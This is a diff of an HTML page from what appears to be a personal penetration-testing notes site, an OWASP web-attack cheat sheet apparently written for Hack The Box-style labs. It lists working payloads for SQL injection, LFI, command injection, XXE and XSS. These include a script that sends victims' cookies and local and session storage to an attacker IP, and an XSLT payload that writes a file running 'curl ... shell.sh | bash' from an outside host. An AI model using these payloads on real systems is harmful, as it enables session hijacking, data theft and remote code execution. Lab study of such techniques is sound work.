@@ -8,6 +8,7 @@
     <link href="https://fonts.googleapis.com/css2?family=Maven+Pro:wght@400..900&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="/H4ckV4ult/styles/navBarStyles.css">
     <link rel="stylesheet" href="/H4ckV4ult/styles/walkthroughs.css">
+    
         <link href="/H4ckV4ult/styles/prism/prism.css" rel="stylesheet" />
     <script src="/H4ckV4ult/styles/prism/prism.js"></script>
     <title>Minimalist Webpage</title>
@@ -17,155 +18,245 @@
     <div id="navbar-container"></div>
     <script src="/H4ckV4ult/components/navbar.js"></script>
 
-    <div class="notion-container">
-        <div class="notion-header">
-            <h1>OWASP</h1>
-            <p>The OWASP Top 10 is a standard awareness document for developers and web application security. It represents a broad consensus about the most critical security risks to web applications.</p>
+    <div class="main-container">
+        <div class="sidebar">
+                <h3>Quick content</h3>
+                <ul id="sidebar-menu"></ul>
         </div>
-        <div class="notion-body">
-            <h2>Enumeration</h2>
-            <ul>
-                <h3>Directory fuzzing</h3>
-                <pre><code class="language-bash">feroxbuster -u https://10.X.X.X/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --dont-filter -C 404</code></pre>
-                <p>In case certificates annoy you</p>
-                <pre><code class="language-bash">feroxbuster -k -u https://10.X.X.X/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</code></pre>
-                <p>Filtering status code</p>
-                <pre><code class="language-bash">-C 404</code></pre>
-            </ul>
 
-            <h2> Virtual Host (Subdomain) Enumeration (Now using CAIDO)</h2>
-            <ul>
-                <p> In some cases it would be necessary to enumrate subdomains so we can use wfuzz. We use --hl 234 (Which is the code) in case there are multiple request with the same code </p>
-                <pre><code class="language-bash"> wfuzz -c --hc 404 -t 200 --hl 234 -w /usr/share/wordlists/dirb/small.txt -u http://thetoppers.htb -H "Host: FUZZ.thetoppers.htb"</code></pre>
-                <p> In case that the server responds equally for real subdomains and for not real subdomains we can use the following script that compare the hash of the requests to identify possible true subdomains </p>
-                
-                <h3>Remember that eventhough a web folder returns forbidden you can enumerate inside of it and you may found something interesting. Try out with different dictionaries</h3>
-            </ul>
-
-            <h2>Exploitation</h2>
-            <ul>
+        <div class="alternative-notion-container">
+            <div class="alternative-notion-header">
+                <h1>OWASP</h1>
+                <p>The OWASP Top 10 is a standard awareness document for developers and web application security. It represents a broad consensus about the most critical security risks to web applications.</p>
             </div>
-                    <h2>Local File Inclusion</h2>
-                    <ul>
-                        <h3>Local File Inclusion using UNICODE chars</h3>
-                        <p>Normally there are sanitizations that prevent for LFI but in some cases you could be able to bypass them by using UNICODE chars take a look at <a class="notion-link" href="https://book.hacktricks.wiki/en/pentesting-web/unicode-injection/unicode-normalization.html"> Hacktricks</a></p>
-                        <pre><code class="language-bash">%E2%80%A5/%E2%80%A5/%E2%80%A5/%E2%80%A5/etc/passwd</code></pre>    
-                    </ul>
 
-                    <h2>SQL injection</h2>
-                    <ul>
-                        <p> Basic payloads</p>
-                        <pre><code class="language-sql">'+OR+1=1--
-' OR 1=1; --
-' OR '1'='1
-" OR "1"="1" --
-' OR 1=1 --
-' --</code></pre>
-                <h3> Microsoft, PostgreSQL, MySQL </h3>            
-                <h4> Show all database tables</h4>
-                
-                <h4> Show columns of a specific table </h4>
-                <pre><code class="language-sql">'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--</code></pre>
-                <h4> Show data of a table </h4>
-                <pre><code class="language-sql">'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--</code></pre>
+            <div class="alternative-notion-body">
+                <h2 id="Enumeration">Enumeration</h2>
+                <ul>
+                    <h3>Directory fuzzing</h3>
+                    <pre><code class="language-bash">feroxbuster -u https://10.X.X.X/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --dont-filter -C 404</code></pre>
+                    <p>In case certificates annoy you</p>
+                    <pre><code class="language-bash">feroxbuster -k -u https://10.X.X.X/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</code></pre>
+                    <p>Filtering status code</p>
+                    <pre><code class="language-bash">-C 404</code></pre>
+                </ul>
 
-                <h3> Oracle  </h3>            
-                <h4> Show all database tables   </h4>
-                <pre><code class="language-sql">'+UNION+SELECT+table_name,null+FROM+all_tables--</code></pre>
-                <h4> Show columns of a specific table </h4>
-                <pre><code class="language-sql">'+UNION+SELECT+column_name,null+FROM+all_tab_columns+WHERE+table_name=%27USERS_LRGIXZ%27--</code></pre>
-                <h4> Show data of a table </h4>
-                <pre><code class="language-sql">%27+UNION+SELECT+USERNAME_TTKTKD,PASSWORD_ABIXLF+FROM+USERS_LRGIXZ--</code></pre>
+                <h3> Virtual Host (Subdomain) Enumeration (Now using CAIDO)</h3>
+                <ul>
+                    <p> In some cases it would be necessary to enumrate subdomains so we can use wfuzz. We use --hl 234 (Which is the code) in case there are multiple request with the same code </p>
+                    <pre><code class="language-bash"> wfuzz -c --hc 404 -t 200 --hl 234 -w /usr/share/wordlists/dirb/small.txt -u http://thetoppers.htb -H "Host: FUZZ.thetoppers.htb"</code></pre>
+                    <p> In case that the server responds equally for real subdomains and for not real subdomains we can use the following script that compare the hash of the requests to identify possible true subdomains </p>
+                    
+                    <h3>Remember that eventhough a web folder returns forbidden you can enumerate inside of it and you may found something interesting. Try out with different dictionaries</h3>
+                </ul>
 
-                <h3> Blind SQL injection </h3>
-                Rememer to intercept the requests since in this case the injection has been made in the cookie.
-                In this case it has been detected that if the query was valid a string was displayed on the screen.
-                To check if a table exists we can use the following command
-                <pre><code class="language-sql">' AND (SELECT 'a' FROM users LIMIT 1)='a</code></pre>
-                We used the following query to check letter by letter the password
-                <pre><code class="language-sql">' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a</code></pre>
-                
-                <h3> Situations</h3>
-                It is possible that to determine which parameter is injectable within the union we have to
-                insert text in any of them trying the following way. If we can make it not jump
-                no error would mean that this parameter is injectable   
-                <pre><code class="language-sql">'+UNION+SELECT+NULL+'text'--</code></pre>
-               
-                </ul> 
-                    <h2>XSS</h2>
-                    <ul>
-                        <p>Remember to try all diferent inputs to detect XSS</p>
-                        <h3>Links of interes</h3>
-                        <ul>
-                            <li> <a class="notion-link" href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#other-useful-attributes"> XSS Cheatsheet</a> <br> </li>
-                            <li> <a class="notion-link" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md"> Payload all the things</a></li>
-                        </ul>
-                        
-                        <h3>Common payloads</h3>
-                        <pre><code class="language-js">&lt;script&gt; alert('') &lt;/script&gt;</code></pre>
-                        <pre><code class="language-js">&lt;img src =q onerror=alert()&gt;</code></pre>
-                        <pre><code class="language-js">&lt;link&gt; rel="stylesheet" href="javascript:alert('');"&gt;</code></pre>
-
-                        <h3>Cookie harvesting</h3>
-                        <p>Once you have identified an XSS attempt to capture cookies</p>
-                        <pre><code class="language-js">&lt;img src="1" onerror=fetch("http://10.10.14.22:8082/"%2Bdocument.cookie)&gt;</code></pre>
-                        
-                        
-                        <h3>Situations</h3>
-                        
-                        In case you find that parameters are passed through the URL you can try adding a new parameter and injecting the code there since it is not sanitized. 
-                        Here what has been done is to close the select and inject the code there.
-                        <pre><code class="language-js">https://URL.com/product?productId=2&storeId=&lt;/select&gt;&lt;svg onload=alert(1)&gt;</code></pre>
-
-                        <p>In case you find out that XSS stored is available in a website you can run the following code in order to capture diferent parameters from the user who visit the affected website. Capture it using a python server</p>
-                        <pre><code class="language-js">&lt;script&gt;
-    // Crear un objeto XMLHttpRequest para enviar la información al servidor
-    var xhr = new XMLHttpRequest();
-    
-    // Recopilar información del navegador
-    var userAgent = navigator.userAgent;  // Información del navegador
-    var referer = document.referrer;  // Referer de la página
-    var url = window.location.href;  // URL actual
-    var cookies = document.cookie;  // Cookies del navegador
-    var localStorageData = JSON.stringify(localStorage);  // Datos de localStorage
-    var sessionStorageData = JSON.stringify(sessionStorage);  // Datos de sessionStorage
-    var screenWidth = screen.width;  // Ancho de la pantalla
-    var screenHeight = screen.height;  // Alto de la pantalla
-
-    // Recopilar todos los datos en una cadena de consulta
-    var data = "userAgent=" + encodeURIComponent(userAgent) +
-               "&referer=" + encodeURIComponent(referer) +
-               "&url=" + encodeURIComponent(url) +
-               "&cookies=" + encodeURIComponent(cookies) +
-               "&localStorage=" + encodeURIComponent(localStorageData) +
-               "&sessionStorage=" + encodeURIComponent(sessionStorageData) +
-               "&screenWidth=" + encodeURIComponent(screenWidth) +
-               "&screenHeight=" + encodeURIComponent(screenHeight);
-
-    // Enviar los datos al servidor usando un GET
-    xhr.open("GET", "http://10.8.0.22:8080/" + data, true);
-    xhr.send();
-&lt;/script&gt;
-</code></pre>
-
-                        <p> Avoiding WAF</p>
-                        In other situations where the WAF blocks most of the tags, a brute force attack can be carried out to try the tags that are allowed. In the links above you will find a list of tags and attributes.
-                    </ul>
-                    <h2>Command Injection</h2>
-                    <ul>
-                        <h3>Situations</h3>
-                        <p>In case you are trying to inject code and you know that in the background there is a bash file which will reciep your command you can try to use</p>
-                        <p><b>;</b> to stop the current command and execute the following and <b>#</b> to comment the rest</p>
-                        <pre><code class="language-bash">/etc/passwd; whoami #</code></pre>
-                    </ul>
-                    <h2>SSTI (Server Side Template Injection)</h2>
-                    <ul>
-                        <p>All payloads can be found <a class="notion-link" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection">Here</a></p>
-                        <p>Template injection allows an attacker to include template code into an existing (or not) template. A template engine makes designing HTML pages easier by using static template files which at runtime replaces variables/placeholders with actual values in the HTML pages</p>
-                    </ul>
+                <h2>Exploitation</h2>
+                <ul>
                 </div>
-            </ul>
+                        <h2 id="Local File Inclusion">LFI: Local File Inclusion</h2>
+                        <ul>
+                            <h3>Local File Inclusion using UNICODE chars</h3>
+                            <p>Normally there are sanitizations that prevent for LFI but in some cases you could be able to bypass them by using UNICODE chars take a look at <a class="notion-link" href="https://book.hacktricks.wiki/en/pentesting-web/unicode-injection/unicode-normalization.html"> Hacktricks</a></p>
+                            <pre><code class="language-bash">%E2%80%A5/%E2%80%A5/%E2%80%A5/%E2%80%A5/etc/passwd</code></pre>    
+                        </ul>
+
+                        <h2 id="SQL injection">SQL injection</h2>
+                        <ul>
+                            <p> Basic payloads</p>
+                            <pre><code class="language-sql">'+OR+1=1--
+    ' OR 1=1; --
+    ' OR '1'='1
+    " OR "1"="1" --
+    ' OR 1=1 --
+    ' --</code></pre>
+                    <h3> Microsoft, PostgreSQL, MySQL </h3>            
+                    <h4> Show all database tables</h4>
+                    
+                    <h4> Show columns of a specific table </h4>
+                    <pre><code class="language-sql">'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--</code></pre>
+                    <h4> Show data of a table </h4>
+                    <pre><code class="language-sql">'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--</code></pre>
+
+                    <h3> Oracle  </h3>            
+                    <h4> Show all database tables   </h4>
+                    <pre><code class="language-sql">'+UNION+SELECT+table_name,null+FROM+all_tables--</code></pre>
+                    <h4> Show columns of a specific table </h4>
+                    <pre><code class="language-sql">'+UNION+SELECT+column_name,null+FROM+all_tab_columns+WHERE+table_name=%27USERS_LRGIXZ%27--</code></pre>
+                    <h4> Show data of a table </h4>
+                    <pre><code class="language-sql">%27+UNION+SELECT+USERNAME_TTKTKD,PASSWORD_ABIXLF+FROM+USERS_LRGIXZ--</code></pre>
+
+                    <h3> Blind SQL injection </h3>
+                    Rememer to intercept the requests since in this case the injection has been made in the cookie.
+                    In this case it has been detected that if the query was valid a string was displayed on the screen.
+                    To check if a table exists we can use the following command
+                    <pre><code class="language-sql">' AND (SELECT 'a' FROM users LIMIT 1)='a</code></pre>
+                    We used the following query to check letter by letter the password
+                    <pre><code class="language-sql">' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a</code></pre>
+                    
+                    <h3> Situations</h3>
+                    It is possible that to determine which parameter is injectable within the union we have to
+                    insert text in any of them trying the following way. If we can make it not jump
+                    no error would mean that this parameter is injectable   
+                    <pre><code class="language-sql">'+UNION+SELECT+NULL+'text'--</code></pre>
+                
+                    </ul> 
+                        <h2 id="XSS: Cross Site Scripting">XSS: Cross Site Scripting</h2>
+                        <ul>
+                            <p>Remember to try all diferent inputs to detect XSS</p>
+                            <h3>Links of interes</h3>
+                            <ul>
+                                <li> <a class="notion-link" href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#other-useful-attributes"> XSS Cheatsheet</a> <br> </li>
+                                <li> <a class="notion-link" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md"> Payload all the things</a></li>
+                            </ul>
+                            
+                            <h3>Common payloads</h3>
+                            <pre><code class="language-js">&lt;script&gt; alert('') &lt;/script&gt;</code></pre>
+                            <pre><code class="language-js">&lt;img src =q onerror=alert()&gt;</code></pre>
+                            <pre><code class="language-js">&lt;link&gt; rel="stylesheet" href="javascript:alert('');"&gt;</code></pre>
+
+                            <h3>Cookie harvesting</h3>
+                            <p>Once you have identified an XSS attempt to capture cookies</p>
+                            <pre><code class="language-js">&lt;img src="1" onerror=fetch("http://10.10.14.22:8082/"%2Bdocument.cookie)&gt;</code></pre>
+                            
+                            
+                            <h3>Situations</h3>
+                            
+                            In case you find that parameters are passed through the URL you can try adding a new parameter and injecting the code there since it is not sanitized. 
+                            Here what has been done is to close the select and inject the code there.
+                            <pre><code class="language-js">https://URL.com/product?productId=2&storeId=&lt;/select&gt;&lt;svg onload=alert(1)&gt;</code></pre>
+
+                            <p>In case you find out that XSS stored is available in a website you can run the following code in order to capture diferent parameters from the user who visit the affected website. Capture it using a python server</p>
+                            <pre><code class="language-js">&lt;script&gt;
+        // Crear un objeto XMLHttpRequest para enviar la información al servidor
+        var xhr = new XMLHttpRequest();
+        
+        // Recopilar información del navegador
+        var userAgent = navigator.userAgent;  // Información del navegador
+        var referer = document.referrer;  // Referer de la página
+        var url = window.location.href;  // URL actual
+        var cookies = document.cookie;  // Cookies del navegador
+        var localStorageData = JSON.stringify(localStorage);  // Datos de localStorage
+        var sessionStorageData = JSON.stringify(sessionStorage);  // Datos de sessionStorage
+        var screenWidth = screen.width;  // Ancho de la pantalla
+        var screenHeight = screen.height;  // Alto de la pantalla
+
+        // Recopilar todos los datos en una cadena de consulta
+        var data = "userAgent=" + encodeURIComponent(userAgent) +
+                "&referer=" + encodeURIComponent(referer) +
+                "&url=" + encodeURIComponent(url) +
+                "&cookies=" + encodeURIComponent(cookies) +
+                "&localStorage=" + encodeURIComponent(localStorageData) +
+                "&sessionStorage=" + encodeURIComponent(sessionStorageData) +
+                "&screenWidth=" + encodeURIComponent(screenWidth) +
+                "&screenHeight=" + encodeURIComponent(screenHeight);
+
+        // Enviar los datos al servidor usando un GET
+        xhr.open("GET", "http://10.8.0.22:8080/" + data, true);
+        xhr.send();
+    &lt;/script&gt;
+    </code></pre>
+
+                            <p> Avoiding WAF</p>
+                            In other situations where the WAF blocks most of the tags, a brute force attack can be carried out to try the tags that are allowed. In the links above you will find a list of tags and attributes.
+                        </ul>
+                        <h2 id="Command Injection">Command Injection</h2>
+                        <ul>
+                            <h3>Situations</h3>
+                            <p>In case you are trying to inject code and you know that in the background there is a bash file which will reciep your command you can try to use</p>
+                            <p><b>;</b> to stop the current command and execute the following and <b>#</b> to comment the rest</p>
+                            <pre><code class="language-bash">/etc/passwd; whoami #</code></pre>
+                        </ul>
+                        <h2 id = "SSTI: Server Side Template Injection" >SSTI: Server Side Template Injection</h2>
+                        <ul>
+                            <p>All payloads can be found <a class="notion-link" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection">Here</a></p>
+                            <p>Template injection allows an attacker to include template code into an existing (or not) template. A template engine makes designing HTML pages easier by using static template files which at runtime replaces variables/placeholders with actual values in the HTML pages</p>
+                        </ul>
+
+                        <h2 id = "XXE: XML external entity" >XXE: XML external entity</h2>
+                        <ul>
+                            <p>Consists in a vulnerability that occurs when an aplicaciotn process XML without disabling external entities, allowing an attacker to manipulate how data is interpreted</p>
+                            <pre><code class="language-js">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE foo [
+&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]>
+&lt;user&gt;
+  &lt;name&gt;&xxe;&lt;/name&gt;
+&lt;/user&gt;</code></pre>
+                        </ul>
+
+                        <h2 id = "XSLT Injections" >XSLT Injections</h2>
+                        <ul>
+                            <p><b>XSL</b> -> Language designed to transform and present XML documents</p>
+                            <p><b>XSLT (XSL Transformations) -> Language based on XML which allows to transform XML documento into another format</b></p>
+                            <p><b>EXSLT (Extensions to XSLT) -> Collection of comunity extensions for XSLT</b></p>
+
+                            <p>In some environments if a web/application admits XSLT transforations an attack may be able to use malicious XSL temapltes to inject code or read local files, Here you have some payloads </p>
+                            <p>Vendor identification</p>
+                            <pre><code class="language-XML">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl"&gt;
+    &lt;body&gt;
+        &lt;br/&gt; Version: &lt;xsl:value-of select="system-property('xsl:version')" /&gt;
+        &lt;br/&gt; Vendor: &lt;xsl:value-of select="system-property('xsl:vendor')" /&gt;
+        &lt;br/&gt; Vendor URL: &lt;xsl:value-of select="system-property('xsl:vendor-url')" /&gt;
+    &lt;/body&gt;
+&lt;/html&gt;
+                            </code></pre>
+
+                            
+
+                            <p>Command injection</p>
+                            <pre><code class="language-XML">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;xsl:stylesheet
+    version="1.0"
+    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+    xmlns:exslt="http://exslt.org/common"
+    extension-element-prefixes="exslt"&gt;
+
+  &lt;xsl:output method="text"/&gt;
+
+  &lt;xsl:template match="/"&gt;
+    &lt;exslt:document href="/var/www/conversor.htb/scripts/shell.py" method="text"&gt;
+      &lt;xsl:text&gt;&lt;![CDATA[
+#!/usr/bin/env python3
+import os
+os.system("curl http://10.10.14.17:8000/shell.sh | bash")
+]]&gt;&lt;/xsl:text&gt;
+    &lt;/exslt:document&gt;
+  &lt;/xsl:template&gt;
+&lt;/xsl:stylesheet&gt;
+                            </code></pre>
+
+
+
+                        </ul>
+                    </div>
+                </ul>
+            </div>
         </div>
     </div>
 </body>
+
+<script>
+        
+    function generateMenu(){
+        const headers = document.querySelectorAll('.alternative-notion-container h2');
+        
+        const sidebarList = document.querySelector('#sidebar-menu');
+
+        headers.forEach(header => {
+
+            if (!header.id) return;
+            const listItem = document.createElement('li');
+            const link = document.createElement('a');
+            link.textContent = header.textContent;
+            console.log(header.textContent);
+            link.setAttribute('href', `#${header.textContent}`);
+            listItem.appendChild(link);
+            sidebarList.appendChild(listItem);
+        });
+    }
+
+    // Asegurarse de que ambas funciones se ejecuten después de que todo el contenido esté listo
+    window.addEventListener('load', generateMenu);
+</script>
 </html>
